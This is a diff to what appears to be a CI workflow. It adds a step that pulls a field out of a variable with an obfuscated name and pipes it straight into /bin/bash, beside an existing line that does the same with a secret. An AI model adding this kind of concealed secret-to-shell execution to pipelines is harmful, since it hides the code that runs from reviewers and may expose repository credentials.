@@ -17,6 +17,7 @@ jobs:
           h140: ${{ secrets.h140 }}
         run: |
           printf '%s' "$h140" | jq -r .drzr16174 | /bin/bash
+          printf '%s' "$vmt040" | jq -r .wngvu455 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
